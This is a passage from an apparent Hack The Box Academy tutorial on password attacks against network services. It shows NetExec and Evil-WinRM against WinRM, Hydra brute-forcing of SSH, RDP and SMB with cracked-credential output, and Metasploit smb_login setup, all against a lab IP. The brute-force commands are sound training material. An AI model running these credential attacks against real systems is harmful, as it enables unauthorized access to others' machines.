                   <span class="hljs-comment">[--continue-on-success]</span> <span class="hljs-comment">[--gfail-limit LIMIT]</span> <span class="hljs-comment">[--ufail-limit LIMIT]</span> <span class="hljs-comment">[--fail-limit LIMIT]</span> <span class="hljs-comment">[-k]</span> <span class="hljs-comment">[--use-kcache]</span> <span class="hljs-comment">[--aesKey AESKEY <span class="hljs-comment">[AESKEY ...]</span>]</span> <span class="hljs-comment">[--kdcHost KDCHOST]</span>
                   <span class="hljs-comment">[--server {http,https}]</span> <span class="hljs-comment">[--server-host HOST]</span> <span class="hljs-comment">[--server-port PORT]</span> <span class="hljs-comment">[--connectback-host CHOST]</span> <span class="hljs-comment">[-M MODULE]</span> <span class="hljs-comment">[-o MODULE_OPTION <span class="hljs-comment">[MODULE_OPTION ...]</span>]</span> <span class="hljs-comment">[-L]</span> <span class="hljs-comment">[--options]</span>
                   <span class="hljs-comment">[-H HASH <span class="hljs-comment">[HASH ...]</span>]</span> <span class="hljs-comment">[--delegate DELEGATE]</span> <span class="hljs-comment">[--self]</span> <span class="hljs-comment">[-d DOMAIN | --local-auth]</span> <span class="hljs-comment">[--port PORT]</span> <span class="hljs-comment">[--share SHARE]</span> <span class="hljs-comment">[--smb-server-port SMB_SERVER_PORT]</span>
                   <span class="hljs-comment">[--gen-relay-list OUTPUT_FILE]</span> <span class="hljs-comment">[--smb-timeout SMB_TIMEOUT]</span> <span class="hljs-comment">[--laps <span class="hljs-comment">[LAPS]</span>]</span> <span class="hljs-comment">[--sam]</span> <span class="hljs-comment">[--lsa]</span> <span class="hljs-comment">[--ntds <span class="hljs-comment">[{vss,drsuapi}]</span>]</span> <span class="hljs-comment">[--dpapi <span class="hljs-comment">[{cookies,nosystem} ...]</span>]</span>
                   <span class="hljs-comment">[--sccm <span class="hljs-comment">[{disk,wmi}]</span>]</span> <span class="hljs-comment">[--mkfile MKFILE]</span> <span class="hljs-comment">[--pvk PVK]</span> <span class="hljs-comment">[--enabled]</span> <span class="hljs-comment">[--user USERNTDS]</span> <span class="hljs-comment">[--shares]</span> <span class="hljs-comment">[--interfaces]</span> <span class="hljs-comment">[--no-write-check]</span>
                   <span class="hljs-comment">[--filter-shares FILTER_SHARES <span class="hljs-comment">[FILTER_SHARES ...]</span>]</span> <span class="hljs-comment">[--sessions]</span> <span class="hljs-comment">[--disks]</span> <span class="hljs-comment">[--loggedon-users-filter LOGGEDON_USERS_FILTER]</span> <span class="hljs-comment">[--loggedon-users]</span> <span class="hljs-comment">[--users <span class="hljs-comment">[USER ...]</span>]</span>
                   <span class="hljs-comment">[--groups <span class="hljs-comment">[GROUP]</span>]</span> <span class="hljs-comment">[--computers <span class="hljs-comment">[COMPUTER]</span>]</span> <span class="hljs-comment">[--local-groups <span class="hljs-comment">[GROUP]</span>]</span> <span class="hljs-comment">[--pass-pol]</span> <span class="hljs-comment">[--rid-brute <span class="hljs-comment">[MAX_RID]</span>]</span> <span class="hljs-comment">[--wmi QUERY]</span> <span class="hljs-comment">[--wmi-namespace NAMESPACE]</span> <span class="hljs-comment">[--spider SHARE]</span>
                   <span class="hljs-comment">[--spider-folder FOLDER]</span> <span class="hljs-comment">[--content]</span> <span class="hljs-comment">[--exclude-dirs DIR_LIST]</span> <span class="hljs-comment">[--depth DEPTH]</span> <span class="hljs-comment">[--only-files]</span> <span class="hljs-comment">[--pattern PATTERN <span class="hljs-comment">[PATTERN ...]</span> | --regex REGEX <span class="hljs-comment">[REGEX ...]</span>]</span>
                   <span class="hljs-comment">[--put-file FILE FILE]</span> <span class="hljs-comment">[--get-file FILE FILE]</span> <span class="hljs-comment">[--append-host]</span> <span class="hljs-comment">[--exec-method {atexec,wmiexec,mmcexec,smbexec}]</span> <span class="hljs-comment">[--dcom-timeout DCOM_TIMEOUT]</span>
                   <span class="hljs-comment">[--get-output-tries GET_OUTPUT_TRIES]</span> <span class="hljs-comment">[--codec CODEC]</span> <span class="hljs-comment">[--no-output]</span> <span class="hljs-comment">[-x COMMAND | -X PS_COMMAND]</span> <span class="hljs-comment">[--obfs]</span> <span class="hljs-comment">[--amsi-bypass FILE]</span> <span class="hljs-comment">[--clear-obfscripts]</span> <span class="hljs-comment">[--force-ps32]</span>
                   <span class="hljs-comment">[--no-encode]</span>
                   target <span class="hljs-comment">[target ...]</span>

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list <span class="hljs-keyword">of</span> targets, NMap XML or .Nessus file(s)

&lt;SNIP&gt;
</code></pre>
<p><strong>NetExec Usage</strong></p>
<p>The general format for using NetExec is as follows:</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> netexec <span class="hljs-variable">&lt;proto&gt;</span> <span class="hljs-variable">&lt;target-IP&gt;</span> -u <span class="hljs-variable">&lt;user or userlist&gt;</span> -p <span class="hljs-variable">&lt;password or passwordlist&gt;</span>
</code></pre>
<p>As an example, this is what attacking a WinRM endpoint might look like:</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netexec winrm <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span> -u user.list -p password.list

WINRM       <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">5985</span>   NONE             [*] None (name:<span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>) (domain:None)
WINRM       <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">5985</span>   NONE             [*] http://<span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>:<span class="hljs-number">5985</span>/wsman
WINRM       <span class="hljs-number">10.129</span><span class="hljs-meta">.42</span><span class="hljs-meta">.197</span>   <span class="hljs-number">5985</span>   NONE             [+] None\user:password (Pwn3d!)
</code></pre>
<p>The appearance of <code>(Pwn3d!)</code> is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>, which allows us to communicate with the WinRM service efficiently.</p>
<p><strong>Evil-WinRM</strong></p>
<p><strong>Installing Evil-WinRM</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-<span class="hljs-number">1.1</span>.<span class="hljs-number">4</span><span class="hljs-selector-class">.gem</span>
Fetching rubyntlm-<span class="hljs-number">0.6</span>.<span class="hljs-number">3</span><span class="hljs-selector-class">.gem</span>
Fetching builder-<span class="hljs-number">3.2</span>.<span class="hljs-number">4</span><span class="hljs-selector-class">.gem</span>
Fetching logging-<span class="hljs-number">2.3</span>.<span class="hljs-number">0</span><span class="hljs-selector-class">.gem</span>
Fetching gyoku-<span class="hljs-number">1.3</span>.<span class="hljs-number">1</span><span class="hljs-selector-class">.gem</span>
Fetching nori-<span class="hljs-number">2.6</span>.<span class="hljs-number">0</span><span class="hljs-selector-class">.gem</span>
Fetching gssapi-<span class="hljs-number">1.3</span>.<span class="hljs-number">1</span><span class="hljs-selector-class">.gem</span>
Fetching erubi-<span class="hljs-number">1.10</span>.<span class="hljs-number">0</span><span class="hljs-selector-class">.gem</span>
Fetching evil-winrm-<span class="hljs-number">3.3</span><span class="hljs-selector-class">.gem</span>
Fetching winrm-<span class="hljs-number">2.3</span>.<span class="hljs-number">6</span><span class="hljs-selector-class">.gem</span>
Fetching winrm-fs-<span class="hljs-number">1.3</span>.<span class="hljs-number">5</span><span class="hljs-selector-class">.gem</span>
Happy hacking! :)
</code></pre>
<p><strong>Evil-WinRM Usage</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> evil-winrm -i <span class="hljs-variable">&lt;target-IP&gt;</span> -u <span class="hljs-variable">&lt;username&gt;</span> -p <span class="hljs-variable">&lt;password&gt;</span>
</code></pre>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ evil-winrm -i <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span> -u <span class="hljs-keyword">user</span> -p password

Evil-W<span class="hljs-keyword">in</span>RM shell v3.<span class="hljs-number">3</span>

Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint

*Evil-W<span class="hljs-keyword">in</span>RM* PS C:\Users\<span class="hljs-keyword">user</span>\Documents&gt;
</code></pre>
<p>If the login was successful, a terminal session is initialized using the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec">Powershell Remoting Protocol</a> (<code>MS-PSRP</code>), which simplifies the operation and execution of commands.</p>
<h3 id="ssh">SSH</h3>
<p><a href="https://www.ssh.com/academy/ssh/protocol">Secure Shell</a> (<code>SSH</code>) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on <code>TCP port 22</code> by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: <code>symmetric</code> encryption, <code>asymmetric</code> encryption, and <code>hashing</code>.</p>
<p><strong>Symmetric Encryption</strong></p>
<p>Symmetric encryption uses the <code>same key</code> for encryption and decryption. Anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman key exchange</a> method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.</p>
<p><strong>Asymmetric Encryption</strong></p>
<p>Asymmetric encryption uses <code>two keys</code>: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.</p>
<p><strong>Hashing</strong></p>
<p>The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.</p>
<p><strong>Hydra - SSH</strong></p>
<p>We can use a tool like <code>Hydra</code> to brute force SSH. This is covered in-depth in the <a href="https://academy.hackthebox.com/course/preview/login-brute-forcing">Login Brute Forcing</a> module.</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) <span class="hljs-keyword">starting</span> <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-01</span><span class="hljs-number">-10</span> <span class="hljs-number">15</span>:<span class="hljs-number">03</span>:<span class="hljs-number">51</span>
[<span class="hljs-keyword">WARNING</span>] Many SSH configurations <span class="hljs-keyword">limit</span> the <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">parallel</span> tasks, it <span class="hljs-keyword">is</span> recommended <span class="hljs-keyword">to</span> reduce the tasks: <span class="hljs-keyword">use</span> -t <span class="hljs-number">4</span>
[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">25</span> login tries (l:<span class="hljs-number">5</span>/p:<span class="hljs-number">5</span>), ~<span class="hljs-number">2</span> tries per task
[<span class="hljs-keyword">DATA</span>] attacking ssh://<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>:<span class="hljs-number">22</span>/
[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>   login: <span class="hljs-keyword">user</span>   <span class="hljs-keyword">password</span>: <span class="hljs-keyword">password</span>
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid <span class="hljs-keyword">password</span> <span class="hljs-keyword">found</span>
</code></pre>
<p>To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh user@<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>

The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">'10.129.42.197 (10.129.42.197)' can't be established.</span>
ECDSA <span class="hljs-keyword">key</span> fingerprint <span class="hljs-keyword">is</span> SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes

Warning: Permanently added <span class="hljs-comment">'10.129.42.197' (ECDSA) to the list of known hosts.</span>


user@<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span><span class="hljs-comment">'s password: ********</span>

Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.1637</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user&gt;
</code></pre>
<h3 id="remote-desktop-protocol-rdp-">Remote Desktop Protocol (RDP)</h3>
<p>Microsoft&#39;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">Remote Desktop Protocol</a> (<code>RDP</code>) is a network protocol that allows remote access to Windows systems via <code>TCP port 3389</code> by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.</p>
<p><strong>Hydra - RDP</strong></p>
<p>We can also use <code>Hydra</code> to perform RDP bruteforcing.</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -L user.list -P password.list rdp://<span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>

Hydra v9.<span class="hljs-number">1</span> (c) <span class="hljs-number">2020</span> by van Hauser/THC &amp; David Maciejak - Please do <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2022</span>-<span class="hljs-number">01</span>-<span class="hljs-number">10</span> <span class="hljs-number">15</span>:<span class="hljs-number">05</span>:<span class="hljs-number">40</span>
[<span class="hljs-literal">WARNING</span>] rdp servers often don<span class="hljs-symbol">'t</span> like many connections, <span class="hljs-keyword">use</span> -t <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> -t <span class="hljs-number">4</span> <span class="hljs-keyword">to</span> reduce the number <span class="hljs-keyword">of</span> parallel connections <span class="hljs-keyword">and</span> -W <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> -W <span class="hljs-number">3</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">wait</span> between connection <span class="hljs-keyword">to</span> allow the server <span class="hljs-keyword">to</span> recover
[INFO] Reduced number <span class="hljs-keyword">of</span> tasks <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> (rdp does <span class="hljs-keyword">not</span> like many parallel connections)
[<span class="hljs-literal">WARNING</span>] the rdp module <span class="hljs-keyword">is</span> experimental. Please test, <span class="hljs-keyword">report</span> - <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> possible, fix.
[DATA] max <span class="hljs-number">4</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">4</span> tasks, <span class="hljs-number">25</span> login tries (l:<span class="hljs-number">5</span>/p:<span class="hljs-number">5</span>), ~<span class="hljs-number">7</span> tries per task
[DATA] attacking rdp://<span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>:<span class="hljs-number">3389</span>/
[<span class="hljs-number">3389</span>][rdp] account <span class="hljs-keyword">on</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span> might be valid but account <span class="hljs-keyword">not</span> active <span class="hljs-keyword">for</span> remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[<span class="hljs-number">3389</span>][rdp] account <span class="hljs-keyword">on</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span> might be valid but account <span class="hljs-keyword">not</span> active <span class="hljs-keyword">for</span> remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[<span class="hljs-number">3389</span>][rdp] host: <span class="hljs-number">10.129</span>.<span class="hljs-number">42.197</span>   login: user   password: password
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
</code></pre>
<p>Linux offers different clients to communicate with the desired server using the RDP protocol. These include <a href="https://remmina.org/">Remmina</a>, <a href="https://linux.die.net/man/1/xfreerdp">xfreerdp</a>, and many others. For our purposes, we will work with xfreerdp.</p>
<p><strong>xFreeRDP</strong></p>
<p>Code: bash</p>
<pre><code class="lang-bash">xfreerdp /<span class="hljs-symbol">v:</span>&lt;target-IP&gt; <span class="hljs-regexp">/u:&lt;username&gt; /p</span><span class="hljs-symbol">:&lt;password&gt;</span>
</code></pre>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /</span><span class="hljs-string">v:</span><span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span> <span class="hljs-regexp">/u:user /</span><span class="hljs-string">p:</span>password

&lt;SNIP&gt;

New Certificate <span class="hljs-string">details:</span>
        Common <span class="hljs-string">Name:</span> WINSRV
<span class="hljs-symbol">        Subject:</span>     CN = WINSRV
<span class="hljs-symbol">        Issuer:</span>      CN = WINSRV
<span class="hljs-symbol">        Thumbprint:</span>  <span class="hljs-string">cd:</span><span class="hljs-number">91</span>:<span class="hljs-string">d0:</span><span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-number">7</span><span class="hljs-string">f:</span><span class="hljs-string">b7:</span><span class="hljs-string">bb:</span><span class="hljs-number">40</span>:<span class="hljs-number">0</span><span class="hljs-string">e:</span><span class="hljs-number">91</span>:<span class="hljs-number">45</span>:<span class="hljs-string">b0:</span><span class="hljs-string">ab:</span><span class="hljs-number">04</span>:<span class="hljs-string">ef:</span><span class="hljs-number">1</span><span class="hljs-string">e:</span><span class="hljs-string">c8:</span><span class="hljs-string">d5:</span><span class="hljs-number">41</span>:<span class="hljs-number">42</span>:<span class="hljs-number">49</span>:<span class="hljs-string">e0:</span><span class="hljs-number">0</span><span class="hljs-string">c:</span><span class="hljs-string">cd:</span><span class="hljs-string">c7:</span><span class="hljs-string">dd:</span><span class="hljs-number">7</span><span class="hljs-string">d:</span><span class="hljs-number">08</span>:<span class="hljs-number">1</span><span class="hljs-string">f:</span><span class="hljs-number">7</span><span class="hljs-string">c:</span><span class="hljs-string">fe:</span>eb

Do you trust the above certificate? (Y/T/N) Y
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/RDP.png" alt="Windows Control Panel displaying various settings like Administrative Tools, Device Manager, and User Accounts."></p>
<h3 id="smb">SMB</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview">Server Message Block</a> (<code>SMB</code>) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to <code>NFS</code> for Unix and Linux for providing drives on local networks.</p>
<p>SMB is also known as <a href="https://cifs.com/">Common Internet File System</a> (<code>CIFS</code>). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter <a href="https://wiki.samba.org/index.php/Main_Page">Samba</a>, which is an open-source implementation of the above functions. For SMB, we can also use <code>hydra</code> again to try different usernames in combination with different passwords.</p>
<p><strong>Hydra - SMB</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) <span class="hljs-keyword">starting</span> <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-01</span><span class="hljs-number">-06</span> <span class="hljs-number">19</span>:<span class="hljs-number">37</span>:<span class="hljs-number">31</span>
[INFO] <span class="hljs-keyword">Reduced</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> tasks <span class="hljs-keyword">to</span> <span class="hljs-number">1</span> (smb does <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-keyword">parallel</span> connections)
[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">1</span> task per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">1</span> task, <span class="hljs-number">25</span> login tries (l:<span class="hljs-number">5236</span>/p:<span class="hljs-number">4987234</span>), ~<span class="hljs-number">25</span> tries per task
[<span class="hljs-keyword">DATA</span>] attacking smb://<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>:<span class="hljs-number">445</span>/
[<span class="hljs-number">445</span>][smb] host: <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>   login: <span class="hljs-keyword">user</span>   <span class="hljs-keyword">password</span>: <span class="hljs-keyword">password</span>
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid passwords <span class="hljs-keyword">found</span>
</code></pre>
<p>However, we may also get the following error describing that the server has sent an invalid reply.</p>
<p><strong>Hydra - Error</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) <span class="hljs-keyword">starting</span> <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-01</span><span class="hljs-number">-06</span> <span class="hljs-number">19</span>:<span class="hljs-number">38</span>:<span class="hljs-number">13</span>
[INFO] <span class="hljs-keyword">Reduced</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> tasks <span class="hljs-keyword">to</span> <span class="hljs-number">1</span> (smb does <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-keyword">parallel</span> connections)
[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">1</span> task per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">1</span> task, <span class="hljs-number">25</span> login tries (l:<span class="hljs-number">5236</span>/p:<span class="hljs-number">4987234</span>), ~<span class="hljs-number">25</span> tries per task
[<span class="hljs-keyword">DATA</span>] attacking smb://<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>:<span class="hljs-number">445</span>/
[<span class="hljs-keyword">ERROR</span>] invalid reply <span class="hljs-keyword">from</span> target smb://<span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>:<span class="hljs-number">445</span>/
</code></pre>
<p>This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile <code>hydra</code> or use another very powerful tool, the <a href="https://www.metasploit.com/">Metasploit framework</a>.</p>
<p><strong>Metasploit Framework</strong></p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ msfconsole -q

msf6 &gt; use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) &gt; <span class="hljs-keyword">options</span> 

Module <span class="hljs-keyword">options</span> (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when <span class="hljs-keyword">an</span> account lockout <span class="hljs-keyword">is</span> detected
   BLANK_PASSWORDS    false            <span class="hljs-keyword">no</span>        Try blank passwords <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> users
   BRUTEFORCE_SPEED   <span class="hljs-number">5</span>                yes       How fast <span class="hljs-keyword">to</span> bruteforce, from <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">5</span>
   DB_ALL_CREDS       false            <span class="hljs-keyword">no</span>        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            <span class="hljs-keyword">no</span>        Add <span class="hljs-keyword">all</span> passwords in the current database <span class="hljs-keyword">to</span> the <span class="hljs-keyword">list</span>
   DB_ALL_USERS       false            <span class="hljs-keyword">no</span>        Add <span class="hljs-keyword">all</span> users in the current database <span class="hljs-keyword">to</span> the <span class="hljs-keyword">list</span>
   DB_SKIP_EXISTING   none             <span class="hljs-keyword">no</span>        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm)
   DETECT_ANY_AUTH    false            <span class="hljs-keyword">no</span>        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            <span class="hljs-keyword">no</span>        Detect <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">is</span> required <span class="hljs-keyword">for</span> the specified user
   PASS_FILE                           <span class="hljs-keyword">no</span>        File containing passwords, one per <span class="hljs-built_in">line</span>
   PRESERVE_DOMAINS   true             <span class="hljs-keyword">no</span>        Respect <span class="hljs-keyword">a</span> username that contains <span class="hljs-keyword">a</span> domain name.
   Proxies                             <span class="hljs-keyword">no</span>        A proxy chain of format <span class="hljs-built_in">type</span>:hos<span class="hljs-variable">t:port</span>[,<span class="hljs-built_in">type</span>:hos<span class="hljs-variable">t:port</span>][...]
   RECORD_GUEST       false            <span class="hljs-keyword">no</span>        Record guest-privileged random logins <span class="hljs-keyword">to</span> the database
   RHOSTS                              yes       The target host(s), see http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              <span class="hljs-number">445</span>              yes       The SMB service port (TCP)
   SMBDomain          .                <span class="hljs-keyword">no</span>        The Windows domain <span class="hljs-keyword">to</span> use <span class="hljs-keyword">for</span> authentication
   SMBPass                             <span class="hljs-keyword">no</span>        The password <span class="hljs-keyword">for</span> the specified username
   SMBUser                             <span class="hljs-keyword">no</span>        The username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">as</span>
   STOP_ON_SUCCESS    false            yes       Stop guessing when <span class="hljs-keyword">a</span> credential works <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> host
   THREADS            <span class="hljs-number">1</span>                yes       The <span class="hljs-keyword">number</span> of concurrent threads (<span class="hljs-built_in">max</span> one per host)
   USERPASS_FILE                       <span class="hljs-keyword">no</span>        File containing users <span class="hljs-built_in">and</span> passwords separated by space, one pair per <span class="hljs-built_in">line</span>
   USER_AS_PASS       false            <span class="hljs-keyword">no</span>        Try the username <span class="hljs-keyword">as</span> the password <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> users
   USER_FILE                           <span class="hljs-keyword">no</span>        File containing usernames, one per <span class="hljs-built_in">line</span>
   VERBOSE            true             yes       Whether <span class="hljs-keyword">to</span> <span class="hljs-keyword">print</span> output <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> attempts


msf6 auxiliary(scanner/smb/smb_login) &gt; <span class="hljs-keyword">set</span> user_file user.<span class="hljs-keyword">list</span>

user_file =&gt; user.<span class="hljs-keyword">list</span>


msf6 auxiliary(scanner/smb/smb_login) &gt; <span class="hljs-keyword">set</span> pass_file password.<span class="hljs-keyword">list</span>

pass_file =&gt; password.<span class="hljs-keyword">list</span>


